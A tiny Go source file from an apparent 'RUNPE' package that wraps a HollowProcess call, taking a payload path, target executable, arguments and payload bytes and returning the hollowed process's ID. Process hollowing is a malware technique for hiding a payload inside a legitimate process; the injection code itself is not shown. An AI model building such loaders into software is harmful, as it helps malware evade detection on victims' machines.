package RUNPE

func RUNPE(payloadPath string, targetPath string, arguments string, payloadByte []byte) int {
	pid := 0
	_,pid = HollowProcess(payloadPath, targetPath, arguments,payloadByte)
	return pid
}
